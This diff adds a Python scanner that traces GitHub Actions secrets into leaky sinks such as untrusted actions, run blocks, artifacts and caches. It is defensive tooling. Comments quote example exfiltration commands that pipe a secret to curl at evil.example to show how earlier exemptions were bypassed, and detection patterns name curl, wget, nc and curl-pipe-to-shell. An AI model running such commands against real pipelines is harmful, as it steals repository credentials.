+            # destinations, not actual KEY=VALUE writes.
+            if key in _TARGET_TOKEN_NAMES:
+                continue
+            pairs.append((key, value))
+    pairs.extend(_extract_envfile_multiline_writes(body, target))
+    return pairs
+
+
+def _merge_env_bindings(
+    env_mapping: object, bound: dict[str, str], *, override: bool,
+) -> None:
+    """Merge one ``env:`` mapping level into ``bound``
+    (env name -> source secret name).
+
+    Entries whose value references ``${{ secrets.X }}`` bind the env
+    name to that secret.  When ``override`` is True, an entry with a
+    NON-secret value removes an inherited binding of the same name —
+    GitHub evaluates env precedence step > job > workflow, so a
+    job-level plain value genuinely shadows a workflow-level secret
+    binding.  Non-mapping input is ignored.
+    """
+    if not isinstance(env_mapping, dict):
+        return
+    for k, v in env_mapping.items():
+        key = str(k)
+        if isinstance(v, str) and _SECRETS_LITERAL_RE.search(v):
+            name_match = re.search(
+                r"secrets\.([A-Za-z_][A-Za-z0-9_]*)", v,
+            )
+            bound[key] = name_match.group(1) if name_match else "?"
+        elif override:
+            bound.pop(key, None)
+
+
+def _value_is_tainted(value: str, job_ctx: _JobContext) -> str | None:
+    """Return the source secret name if ``value`` references any
+    currently-tainted thing in this job: a literal
+    ``${{ secrets.X }}``, a previously-bound ``$NAME``, or a
+    ``${{ steps.<id>.outputs.<name> }}`` whose output is tainted.
+
+    Returns the FIRST matched source secret name (for evidence);
+    None if untainted.
+    """
+    m = re.search(r"secrets\.([A-Za-z_][A-Za-z0-9_]*)", value)
+    if m:
+        return m.group(1)
+    for env_m in _ENV_SHELL_RE.finditer(value):
+        var = env_m.group(1)
+        if var in job_ctx.secret_bound_env:
+            return job_ctx.secret_bound_env[var]
+    for env_m in _ENV_TEMPLATE_RE.finditer(value):
+        var = env_m.group(1)
+        if var in job_ctx.secret_bound_env:
+            return job_ctx.secret_bound_env[var]
+    for out_m in _STEPS_OUTPUT_RE.finditer(value):
+        step_id = out_m.group(1)
+        out_name = out_m.group(2)
+        bound = job_ctx.secret_bound_outputs.get(step_id, {})
+        if out_name in bound:
+            return bound[out_name]
+    return None
+
+
+@dataclass(frozen=True)
+class SecretFlowHit:
+    """A statically-visible secret → sink edge in a workflow."""
+
+    dependency: Dependency
+    workflow_path: Path
+    job_id: str
+    step_index: int
+    sink_kind: str               # "untrusted_action", "run_block",
+                                 # "upload_artifact", "cache_save",
+                                 # "tojson_secrets", "tojson_env",
+                                 # "computed_access", "local_action",
+                                 # "reusable_workflow_inherit"
+    secret_names: tuple          # tuple of secret names referenced;
+                                 # ``("*",)`` for toJSON / computed
+    detail: str
+    severity: str                # "info" | "low" | "medium" | "high"
+
+
+@dataclass
+class _JobContext:
+    """Per-job tracking state.  Reset at job boundary — env bindings
+    do NOT cross jobs."""
+    secret_bound_env: dict[str, str] = field(default_factory=dict)
+    # name -> source-secret-name for evidence
+    secret_bound_outputs: dict[str, dict[str, str]] = field(
+        default_factory=dict,
+    )
+    # step_id -> {output_name -> source-secret-name}.  Populated when
+    # a ``run:`` body writes ``KEY=<tainted>`` to ``$GITHUB_OUTPUT``;
+    # downstream steps' references to ``steps.<id>.outputs.<key>``
+    # become tainted via this mapping.
+    env_written_to_disk: bool = False
+    # True iff some prior step in this job ran a command that wrote
+    # env contents OR a secret-bound var to a file.  Required to
+    # promote ``actions/upload-artifact`` / ``actions/cache`` sinks
+    # from medium (informational) to high (active leak risk):
+    # without an env-to-disk write, the artifact / cache carrying
+    # the secret would require the SECRET to have already been
+    # written to a file the upload covers.  Empirically the
+    # high-confidence shape; raw job-level env binding alone
+    # produced FP-floods on real workflows (mitmproxy
+    # ``upload-artifact`` for unrelated build outputs).
+
+
+# The argument fillers here and in _VAR_DUMP_RE_FACTORY are bounded:
+# unbounded, every planted command keyword on an unredirected line
+# re-scans the rest of the line — quadratic on hostile workflow
+# text. The bounds sit far above any real dump-to-file command
+# line (and, in the var-dump shape, keep the filler/variable/filler
+# fan-out constant); a longer gap stops matching.
+_ENV_DUMP_RE = re.compile(
+    r"""
+    \b(?:env|printenv|set|export\s+-p)\b   # env-dumping commands
+    [^\n|>]{0,500}                          # anything except pipe/newline/redirect
+    >+(?!>)                                 # all consecutive > (no backtracking past last >)
+    \s*
+    (?:"|'|)                                # optional quote
+    (?!\s*\$\{?GITHUB_(?:ENV|OUTPUT|PATH))  # NOT a GHA-target write
+    """,
+    re.VERBOSE,
+)
+# (?=\S) pins the whitespace run before the lazy argument filler
+# (same language — the filler absorbed any remainder): the naive
+# ``\s+[^\n|]*?`` overlapped the run and the filler — quadratic on
+# an echo-opening line ending in a whitespace run.
+# The pre-variable filler is additionally tempered against the
+# variable reference itself, so a line dense in ``$VAR`` teasers
+# cannot multiply the filler/variable/filler decompositions — the
+# match always binds the first reference in its window; a redirect
+# more than the filler bound past that reference stops matching.
+_VAR_DUMP_RE_FACTORY = lambda var: re.compile(
+    rf"""
+    \b(?:echo|printf)\s+(?=\S)
+    (?:(?!\$\{{?{re.escape(var)})[^\n|]){{0,200}}?
+    \$\{{?{re.escape(var)}\}}?
+    [^\n|>]{{0,300}}
+    >+(?!>)
+    \s*
+    (?!\s*\$\{{?GITHUB_(?:ENV|OUTPUT|PATH))
+    """,
+    re.VERBOSE,
+)
+
+
+def _body_writes_env_to_disk(
+    body: str, secret_bound_env: dict[str, str],
+) -> bool:
+    """True iff ``body`` contains an ``env`` / ``printenv`` / ``set``
+    dump to a non-GHA-target file, OR an ``echo $VAR > file`` where
+    ``VAR`` is in the job's secret-bound-env mapping.
+
+    Defends against the over-aggressive ``upload-artifact`` /
+    ``actions/cache`` sinks: just having ``env: TOK: ${secret}``
+    in a job is NOT sufficient evidence of a leak — the secret
+    needs to actually reach disk for the artifact to carry it.
+    """
+    if _ENV_DUMP_RE.search(body):
+        return True
+    return any(_VAR_DUMP_RE_FACTORY(var).search(body) for var in secret_bound_env)
+
+
+def _strip_bash_full_line_comments(body: str) -> str:
+    """Drop bash full-line comments — lines whose first non-whitespace
+    character is ``#``.  End-of-line comments (``cmd  # tail``) are
+    kept; stripping them accurately requires knowing whether the
+    ``#`` is inside a quoted string, which needs a real bash parser.
+
+    Defends against the comment-block FP: a workflow author who
+    explains the body's security shape in a comment block at the
+    top of the ``run:`` might write ``# we don't reference
+    $GH_TOKEN directly because ...``.  That literal text isn't a
+    runtime reference but the unstripped scanner sees ``$GH_TOKEN``
+    and fires.  Dogfooded against RAPTOR's own ``sca-self-bump.yml``.
+    """
+    return "\n".join(
+        "" if line.lstrip().startswith("#") else line
+        for line in body.split("\n")  # line-model: YAML scalar loading already normalised line breaks to \n
+    )
+
+
+# Known stdin-credential consumers for the ``--password-stdin``
+# exemption.  The exemption must NAME the consumer: the earlier
+# ``| <anything> ... --password-stdin`` shape was attacker-
+# satisfiable — ``echo "$SECRET" | sh -c 'curl -d @- https://evil.
+# example' --password-stdin`` exfiltrates (sh -c ignores trailing
+# args as $0) yet matched, suppressing the run_block finding.
+_STDIN_CONSUMERS = (
+    r"(?:docker|podman|buildah|nerdctl|skopeo|oras|crane|helm|regctl)"
+)
+_STDIN_PIPE_RE = re.compile(
+    # Anchored to the WHOLE stripped line: the exemption applies to
+    # the exact single-command shape only.  An unanchored search let
+    # anything ride shotgun on the same line — ``… --password-stdin
+    # && echo "$TOKEN" | curl -d @- https://evil.example`` exempted
+    # the exfil because the line CONTAINED a matching prefix.
+    r"""^echo\s+["']?\$(?:\{\{[^}]*secrets\.[^}]*\}\}|"""
+    r"""[A-Z_]+)["']?\s*\|\s*"""
+    + _STDIN_CONSUMERS
+    # Subcommand chain ending in ``login`` (``login`` / ``auth
+    # login`` / ``registry login``), then only plain arguments
+    # BEFORE AND AFTER the flag, to end of line: no pipes,
+    # separators, redirects, backticks or ``$(`` command
+    # substitution may appear anywhere in the exempted token stream
+    # (plain ``$VAR`` / ``${{ ... }}`` expansions are fine).
+    # The subcommand loop is bounded ({0,16}): it overlaps the
+    # ``login`` literal on word chars, so an unbounded loop cost
+    # every split of a subcommand-word run — quadratic. Sixteen
+    # subcommand tokens sits far above real CLI chains.
+    # (?=\S) pins the post-login whitespace run — the argument
+    # class admits whitespace, so an unpinned run split against it
+    # (quadratic on a login line ending in a whitespace run).
+    + r"""\s+(?:[\w.-]+\s+){0,16}login\s+(?=\S)(?:\$(?!\()|[^|;&<>$`])*"""
+    + r"""--password-stdin(?:\$(?!\()|[^|;&<>$`])*$""",
+)
+
+
+def _all_refs_stdin_piped(
+    body: str, secret_env: dict[str, str],
+) -> bool:
+    """True when every secret-referencing line in the body uses the
+    ``echo "$SECRET" | <command> --password-stdin`` pattern — the
+    standard safe credential-passing form for docker login et al.
+
+    Only inspects direct secret literals and secret-bound env vars;
+    step-output taint is invisible here.  Returns False when no
+    direct-ref lines are found (no vacuous truth) so callers that
+    also track step-output taint are not accidentally suppressed."""
+    lines = body.splitlines()
+    found_any = False
+    for line in lines:
+        stripped = line.strip()
+        if not stripped or stripped.startswith("#"):
+            continue
+        has_secret_ref = False
+        for m in _SECRETS_LITERAL_RE.finditer(stripped):
+            has_secret_ref = True
+        for m in _ENV_SHELL_RE.finditer(stripped):
+            if m.group(1) in secret_env:
+                has_secret_ref = True
+        for m in _ENV_TEMPLATE_RE.finditer(stripped):
+            if m.group(1) in secret_env:
+                has_secret_ref = True
+        if has_secret_ref:
+            found_any = True
+            if not _STDIN_PIPE_RE.search(stripped):
+                return False
+    return found_any
+
+
+def _is_truthy_run_body_egress(body: str) -> bool:
+    """Heuristic: a ``run:`` body that does network egress or a
+    redirect-to-file pattern is a potential exfil sink.  Reuses the
+    install-hook dangerous-pattern logic in spirit but applied to
+    the run-body content."""
+    # Network egress shapes
+    if re.search(r"\bcurl\b|\bwget\b|\bnc\b|\bdig\b|\bhost\b", body):
+        return True
+    # File-write patterns (the secret will leave via cache or
+    # artifact uploads later)
+    if re.search(r">>?\s*\$?GITHUB_(OUTPUT|ENV)|>>?\s*/tmp/", body):
+        return True
+    # IFS / base64 / curl-pipe-shell. The curl-to-pipe gap is
+    # bounded: unbounded, every planted ``curl`` on an unpiped line
+    # re-scanned the rest of the line — quadratic on hostile run
+    # bodies. 1000 is far above any real fetch-and-pipe command.
+    return bool(
+        re.search(r"curl.{1,1000}\|\s*(?:bash|sh)|base64\s+(?:-d|--decode)",
+                  body)
+    )
+
+
+def _scan_one_step(
+    step: dict,
+    job_id: str,
+    step_index: int,
+    job_ctx: _JobContext,
+    workflow_path: Path,
+    dep: Dependency,
+) -> list[SecretFlowHit]:
+    """Scan a single workflow step for secret-flow edges.  Mutates
+    ``job_ctx`` to record env bindings derived from secrets."""
+    if not isinstance(step, dict):
+        return []
+    hits: list[SecretFlowHit] = []
+
+    # 1) Update env bindings — anything assigned from a secret-flavoured
+    #    expression becomes secret-tainted within this job.  Bind-only
+    #    (no override): a step-level plain value shadows only for that
+    #    step, but the job context persists across steps, so removing
+    #    the binding here would wrongly untaint LATER steps.
+    _merge_env_bindings(step.get("env"), job_ctx.secret_bound_env,
+                        override=False)
+
+    # 2) toJSON(secrets) — the high-confidence anchor.  Any reference
+    #    anywhere in the step's serialised yaml fires.
+    #    ``default=str``: YAML scalars like an unquoted ``2024-01-01``
+    #    parse to ``datetime.date`` objects, which ``json.dumps``
+    #    refuses by default — and one such benign value in any step
+    #    would otherwise abort the whole scan with a TypeError.
+    step_yaml = json.dumps(step, default=str)
+    if _TOJSON_SECRETS_RE.search(step_yaml):
+        hits.append(SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=step_index,
+            sink_kind="tojson_secrets", secret_names=("*",),
+            detail=(
+                "step references ``toJSON(secrets)`` — enumerates "
+                "every workflow secret as JSON; no legitimate use"
+            ),
+            severity="high",
+        ))
+    # toJSON(env) is a sink only when env bindings include secret-
+    # derived values in this job.
+    if _TOJSON_ENV_RE.search(step_yaml) and job_ctx.secret_bound_env:
+        hits.append(SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=step_index,
+            sink_kind="tojson_env",
+            secret_names=tuple(sorted(job_ctx.secret_bound_env.keys())),
+            detail=(
+                "step references ``toJSON(env)`` AND this job has "
+                "env bindings derived from secrets — same as "
+                "toJSON(secrets) in effect"
+            ),
+            severity="high",
+        ))
+
+    # 3) Computed secret access — ``secrets[<expr>]``.  No legitimate
+    #    reason to compute the secret name at expression time.
+    if _SECRETS_DICT_RE.search(step_yaml):
+        hits.append(SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=step_index,
+            sink_kind="computed_access", secret_names=("*",),
+            detail=(
+                "step uses computed secret access ``secrets[...]`` — "
+                "no static visibility into which secrets flow; high "
+                "suspicion shape"
+            ),
+            severity="medium",
+        ))
+
+    # 4) Action use — ``uses:``.
+    uses = step.get("uses")
+    if isinstance(uses, str):
+        action_name = _action_name(uses)
+        is_local = action_name.startswith(("./", "../"))
+        # Trust any first-party ``actions/<name>`` action (GitHub's
+        # official org).  The ``actions/`` GitHub org is the
+        # canonical source of first-party workflow primitives; any
+        # action under it is GitHub-maintained.  Enumerating each
+        # one in the data file would inflate the allowlist and
+        # break on every new official action GitHub ships.
+        is_trusted = (
+            action_name in _trusted_consumers()
+            or action_name.startswith("actions/")
+        )
+        # Find secret-tainted inputs flowing into this action
+        with_inputs = step.get("with") or {}
+        tainted_inputs: list[str] = []
+        if isinstance(with_inputs, dict):
+            for in_name, in_val in with_inputs.items():
+                if not isinstance(in_val, str):
+                    continue
+                # Expression-scoped unanchored grammar: catches the
+                # plain ``${{ secrets.X }}`` / ``${{ toJSON(secrets)
+                # }}`` spellings AND expression-function wraps
+                # (``${{ format('{0}', secrets.X) }}``).
+                if _expression_secret_refs(in_val):
+                    tainted_inputs.append(str(in_name))
+                    continue
+                # env.X referenced + X is secret-bound in this job
+                matched = False
+                for m in _ENV_TEMPLATE_RE.finditer(in_val):
+                    if m.group(1) in job_ctx.secret_bound_env:
+                        tainted_inputs.append(str(in_name))
+                        matched = True
+                        break
+                if matched:
+                    continue
+                # steps.<id>.outputs.<name> reference + that output
+                # was tainted by a prior step in this job.
+                for sm in _STEPS_OUTPUT_RE.finditer(in_val):
+                    step_id = sm.group(1)
+                    out_name = sm.group(2)
+                    bound = job_ctx.secret_bound_outputs.get(step_id, {})
+                    if out_name in bound:
+                        tainted_inputs.append(str(in_name))
+                        break
+        # Step-level env entries also flow if step.env binds a secret
+        # and the action is not trusted.
+        env_tainted = bool(job_ctx.secret_bound_env)
+        if tainted_inputs:
+            if is_trusted:
+                # Legitimate — trusted consumer.  No finding.
+                pass
+            elif is_local:
+                hits.append(SecretFlowHit(
+                    dependency=dep, workflow_path=workflow_path,
+                    job_id=job_id, step_index=step_index,
+                    sink_kind="local_action",
+                    secret_names=tuple(tainted_inputs),
+                    detail=(
+                        f"secret-tainted input(s) {tainted_inputs!r} "
+                        f"flow into local action ``{action_name}``; "
+                        "local actions bypass the trusted-consumer "
+                        "allowlist — body is in-tree and should be "
+                        "audited"
+                    ),
+                    severity="medium",
+                ))
+            else:
+                # NOTE: a ``.yml``-suffixed step-level ``uses:`` is
+                # not valid GHA (reusable workflows are invoked at
+                # JOB level — handled in ``_scan_workflow``); if one
+                # appears anyway it lands here as an untrusted
+                # action, the fail-closed direction.
+                hits.append(SecretFlowHit(
+                    dependency=dep, workflow_path=workflow_path,
+                    job_id=job_id, step_index=step_index,
+                    sink_kind="untrusted_action",
+                    secret_names=tuple(tainted_inputs),
+                    detail=(
+                        f"secret-tainted input(s) {tainted_inputs!r} "
+                        f"flow into non-allowlisted action "
+                        f"``{action_name}``"
+                    ),
+                    severity="high",
+                ))
+        # Sink: actions/upload-artifact — leak surface tightening.
+        # Pre-2026-06: fired ``high`` on any env-tainted job.
+        # Post-tightening: fires high ONLY when a prior step in the
+        # same job wrote env or a secret-bound var to a file.
+        # Otherwise downgrades to medium (informational — the upload
+        # carries the secret only if some step writes it to disk
+        # first, which we couldn't detect; reviewer triages).
+        # Skip when the ONLY tainted env var is GITHUB_TOKEN (an
+        # ephemeral, auto-scoped token that GitHub rotates per-job)
+        # and no env-to-disk write preceded the upload.
+        _only_github_token = (
+            set(job_ctx.secret_bound_env.keys()) == {"GITHUB_TOKEN"}
+        )
+        if (
+            action_name == "actions/upload-artifact"
+            and env_tainted
+            and not (_only_github_token and not job_ctx.env_written_to_disk)
+        ):
+            if job_ctx.env_written_to_disk:
+                severity = "high"
+                detail_suffix = (
+                    " AND a prior step in this job wrote env / a "
+                    "secret-bound var to disk — upload likely carries "
+                    "the secret"
+                )
+            else:
+                severity = "medium"
+                detail_suffix = (
+                    " — no prior env-to-disk write detected; the "
+                    "upload only carries the secret if a step "
+                    "we couldn't statically resolve persisted it"
+                )
+            hits.append(SecretFlowHit(
+                dependency=dep, workflow_path=workflow_path,
+                job_id=job_id, step_index=step_index,
+                sink_kind="upload_artifact",
+                secret_names=tuple(
+                    sorted(job_ctx.secret_bound_env.keys()),
+                ),
+                detail=(
+                    "actions/upload-artifact in a job with env "
+                    "bindings derived from secrets" + detail_suffix
+                ),
+                severity=severity,
+            ))
+        # Sink: actions/cache@save — same shape (cache outlives
+        # the runner, attacker who controls a later run reads it).
+        if action_name == "actions/cache" and env_tainted:
+            # Only ``save`` mode is the write side, but mode is
+            # often implicit (the action saves on success).  Same
+            # tightening as upload-artifact: require evidence of an
+            # env-to-disk write in this job for medium; otherwise
+            # downgrade to low.
+            if job_ctx.env_written_to_disk:
+                cache_severity = "medium"
+                cache_detail = (
+                    "actions/cache used in a job with secret-derived "
+                    "env bindings AND a prior env-to-disk write — "
+                    "cached paths can outlive the runner; review the "
+                    "cached file set"
+                )
+            else:
+                cache_severity = "low"
+                cache_detail = (
+                    "actions/cache used in a job with secret-derived "
+                    "env bindings — no prior env-to-disk write "
+                    "detected; review whether the cache set could "
+                    "include the secret"
+                )
+            hits.append(SecretFlowHit(
+                dependency=dep, workflow_path=workflow_path,
+                job_id=job_id, step_index=step_index,
+                sink_kind="cache_save",
+                secret_names=tuple(
+                    sorted(job_ctx.secret_bound_env.keys()),
+                ),
+                detail=cache_detail,
+                severity=cache_severity,
+            ))
+
+    # 5) ``run:`` shell body.
+    step_id_value = step.get("id")
+    step_id_str = step_id_value if isinstance(step_id_value, str) else ""
+    run_body = step.get("run")
+    if isinstance(run_body, str) and run_body.strip():
+        # Track env-to-disk writes so the upload-artifact / cache
+        # sinks can require evidence stronger than "env binding
+        # alone" before promoting to high severity.  Set once per
+        # job; resets only at job boundary.
+        if not job_ctx.env_written_to_disk and _body_writes_env_to_disk(
+            run_body, job_ctx.secret_bound_env,
+        ):
+            job_ctx.env_written_to_disk = True
+        # Mask-line is the canonical legitimate use of a secret in
+        # a run body.  The mask OCCURRENCE itself must not FP, but
+        # taint bindings from any GITHUB_ENV/OUTPUT writes in the
+        # SAME body still update (a body that masks ONE secret can
+        # still leak another via redirect), and any OTHER reference
+        # to the masked secret in the body still counts.
+        # Strip bash full-line comments before scanning for
+        # ``$VAR`` references — a comment explaining what the body
+        # does or why the secret-handling pattern is safe must not
+        # itself trigger the detector (the literal text ``$GH_TOKEN``
+        # inside a ``#`` comment can't leak the secret at runtime).
+        # End-of-line comments after a command are not stripped —
+        # accurate detection would need a bash parser, which we
+        # avoid; the FP-shape we close here is the common "docstring-
+        # like full-line comment block at top of run body".
+        scan_body = _strip_bash_full_line_comments(run_body)
+        # Excise the ``echo "::add-mask::${{ secrets.X }}"`` occurrences
+        # THEMSELVES before scanning for references.  Only the mask
+        # text is exempt: masking hides the value from log output but
+        # does not neutralise other uses, so a body that masks a
+        # secret AND also passes it to curl still fires on the curl
+        # reference.  (The old shape collected the masked secret
+        # NAMES and filtered every reference to them — an attacker
+        # could silence the detector for a secret by adding a mask
+        # line for it.)
+        ref_scan_body = _MASK_RE.sub("", scan_body)
+        # Check whether the body references a secret literal (plain
+        # or wrapped in an expression function — the unanchored
+        # grammar scoped to ``${{ … }}`` interiors), a
+        # secret-tainted env var, or a tainted prior-step output.
+        secret_refs_in_body: list[str] = []
+        secret_refs_in_body.extend(
+            _expression_secret_refs(ref_scan_body),
+        )
+        for m in _ENV_SHELL_RE.finditer(ref_scan_body):
+            var = m.group(1)
+            if var in job_ctx.secret_bound_env:
+                secret_refs_in_body.append(
+                    job_ctx.secret_bound_env[var],
+                )
+        for m in _ENV_TEMPLATE_RE.finditer(ref_scan_body):
+            var = m.group(1)
+            if var in job_ctx.secret_bound_env:
+                secret_refs_in_body.append(
+                    job_ctx.secret_bound_env[var],
+                )
+        for sm in _STEPS_OUTPUT_RE.finditer(ref_scan_body):
+            step_id = sm.group(1)
+            out_name = sm.group(2)
+            bound = job_ctx.secret_bound_outputs.get(step_id, {})
+            if out_name in bound:
+                secret_refs_in_body.append(bound[out_name])
+        unmasked_refs = secret_refs_in_body
+        # Safe-sink exemption: piping a secret into a command's
+        # stdin (e.g. ``echo "$TOKEN" | docker login --password-stdin``)
+        # is the RECOMMENDED credential-passing pattern — the secret
+        # never touches the filesystem or process argv. Suppress the
+        # finding when every secret reference in the body appears only
+        # inside a pipe-to-stdin pattern.
+        if unmasked_refs and _all_refs_stdin_piped(
+            ref_scan_body, job_ctx.secret_bound_env,
+        ):
+            unmasked_refs = []
+        if unmasked_refs:
+            severity = (
+                "high"
+                if _is_truthy_run_body_egress(scan_body)
+                else "medium"
+            )
+            hits.append(SecretFlowHit(
+                dependency=dep, workflow_path=workflow_path,
+                job_id=job_id, step_index=step_index,
+                sink_kind="run_block",
+                secret_names=tuple(sorted(set(unmasked_refs))),
+                detail=(
+                    f"``run:`` block references secret(s) "
+                    f"{sorted(set(unmasked_refs))!r} outside "
+                    f"the standard echo-with-mask form"
+                ),
+                severity=severity,
+            ))
+        # Cross-step laundering: this body writes ``KEY=<tainted>``
+        # to ``$GITHUB_ENV`` or ``$GITHUB_OUTPUT``.  Update the
+        # job's taint bindings so DOWNSTREAM steps see the
+        # propagated taint at their sinks.  No finding here — the
+        # laundering step itself isn't the sink.
+        for key, value in _extract_redirected_writes(
+            scan_body, "GITHUB_ENV",
+        ):
+            source = _value_is_tainted(value, job_ctx)
+            if source is not None:
+                job_ctx.secret_bound_env[key] = source
+        if step_id_str:
+            for key, value in _extract_redirected_writes(
+                scan_body, "GITHUB_OUTPUT",
+            ):
+                source = _value_is_tainted(value, job_ctx)
+                if source is not None:
+                    job_ctx.secret_bound_outputs.setdefault(
+                        step_id_str, {},
+                    )[key] = source
+
+    return hits
+
+
+def _scan_reusable_workflow_job(
+    job: dict,
+    job_id: str,
+    job_uses: str,
+    workflow_path: Path,
+    dep: Dependency,
+) -> list[SecretFlowHit]:
+    """Job-level ``uses:`` — a reusable-workflow invocation.
+
+    Cross-workflow flow is out of static scope here (the called
+    workflow may live in another repo at a mutable ref), so the
+    finding is low-severity informational, per the adversarial-model
+    contract: ``secrets: inherit`` forwards EVERY repository secret;
+    an explicit ``secrets:`` map forwards the named ones.  A call
+    that passes no secrets gets no finding.
+    """
+    secrets_val = job.get("secrets")
+    if secrets_val == "inherit":
+        return [SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=0,
+            sink_kind="reusable_workflow_inherit",
+            secret_names=("*",),
+            detail=(
+                f"job invokes reusable workflow ``{job_uses}`` with "
+                "``secrets: inherit`` — EVERY repository secret is "
+                "forwarded; static scope ends at the workflow boundary"
+            ),
+            severity="low",
+        )]
+    if isinstance(secrets_val, dict) and secrets_val:
+        names = tuple(sorted(str(k) for k in secrets_val))
+        return [SecretFlowHit(
+            dependency=dep, workflow_path=workflow_path,
+            job_id=job_id, step_index=0,
+            sink_kind="reusable_workflow_inherit",
+            secret_names=names,
+            detail=(
+                f"job invokes reusable workflow ``{job_uses}`` "
+                f"passing secret(s) {list(names)!r}; static scope "
+                "ends at the workflow boundary"
+            ),
+            severity="low",
+        )]
+    return []
+
+
+def _scan_workflow(
+    workflow_path: Path, dep: Dependency,
+) -> list[SecretFlowHit]:
+    """Parse one workflow YAML and scan every job's every step."""
+    # Read-cap defends against a pathologically large workflow
+    # YAML.  Real GitHub Actions caps workflow files at 1 MB
+    # (documented limit); we accept up to 2 MB to be generous
+    # for forked workflow tooling that may not enforce the
+    # limit locally.  The shared bounded reader also refuses
+    # symlinks and non-regular files (FIFO hang / host-file read).
+    text = _safe_read.read_bounded(
+        workflow_path, max_bytes=_MAX_WORKFLOW_YAML_BYTES,
+        follow_symlinks=False,
+    )
+    if text is None:
+        return []
+    try:
+        data = safe_load(text)
+    except Exception as exc:      # pragma: no cover  # noqa: BLE001
+        # PyYAML raises a wide tree of exceptions on malformed input
+        # — we don't care which one; just skip the workflow.
+        logger.debug(
+            "sca.supply_chain.gha_secret_flow: %s failed to parse "
+            "(%s); skipping",
+            workflow_path, exc,
+        )
+        return []
+    if not isinstance(data, dict):
+        return []
+    jobs = data.get("jobs")
+    if not isinstance(jobs, dict):
+        return []
+    # Workflow-root ``env:`` bindings apply to every job (and are the
+    # most common place real workflows bind a secret to an env name);
+    # precedence is step > job > workflow, so a job-level entry with
+    # the same name shadows the workflow-level one.
+    workflow_env = data.get("env")
+    hits: list[SecretFlowHit] = []
+    for job_id, job in jobs.items():
+        if not isinstance(job, dict):
+            continue
+        ctx = _JobContext()
+        _merge_env_bindings(workflow_env, ctx.secret_bound_env,
+                            override=False)
+        # Job-level env bindings (apply to every step in the job);
+        # non-secret values shadow an inherited workflow-level
+        # binding of the same name.
+        _merge_env_bindings(job.get("env"), ctx.secret_bound_env,
+                            override=True)
+        # Reusable workflows are invoked at JOB level
+        # (``jobs.<id>.uses`` + ``secrets: inherit`` / an explicit
+        # ``secrets:`` map) — such jobs have no ``steps`` and were
+        # previously skipped whole, making the documented
+        # ``reusable_workflow_inherit`` finding unreachable.
+        job_uses = job.get("uses")
+        if isinstance(job_uses, str):
+            hits.extend(_scan_reusable_workflow_job(
+                job, str(job_id), job_uses, workflow_path, dep,
+            ))
+            continue
+        steps = job.get("steps")
+        if not isinstance(steps, list):
+            continue
+        for idx, step in enumerate(steps):
+            hits.extend(_scan_one_step(
+                step, str(job_id), idx, ctx, workflow_path, dep,
+            ))
+    return hits
+
+
+def scan_target(
+    target: Path,
+    manifests: Sequence[Manifest] = (),
+    deps: Sequence[Dependency] = (),
+) -> list[SecretFlowHit]:
+    """Walk ``target/.github/workflows/`` for ``*.yml`` and ``*.yaml``
+    files and scan each for secret-flow shapes."""
+    target = target.resolve()
+    workflow_dir = target / ".github" / "workflows"
+    if not workflow_dir.is_dir():
+        return []
+    out: list[SecretFlowHit] = []
+    for entry in sorted(workflow_dir.iterdir()):
+        if entry.is_file() and entry.suffix in (".yml", ".yaml"):
+            out.extend(_scan_workflow(entry, _placeholder_dep(target, entry.name)))
+    return out
+
+
+def _placeholder_dep(target: Path, workflow: str) -> Dependency:
+    """Workflow-flow hits don't have a natural dependency-row owner;
+    they target the project itself. Name the workflow file so the
+    finding's operator-facing title/name identify WHICH workflow —
+    the literal "<workflow>" placeholder used to leak all the way
+    into report titles."""
+    return Dependency(
+        ecosystem="GitHub Actions",
+        name=workflow,
+        version=None,
+        declared_in=target,
+        scope="main",
+        is_lockfile=False,
+        pin_style=PinStyle.UNKNOWN,
+        direct=True,
+        purl="",
+        parser_confidence=Confidence(
+            "low", reason="workflow secret-flow finding host",
+        ),
+    )
+
+
+__all__ = ["SecretFlowHit", "scan_target"]
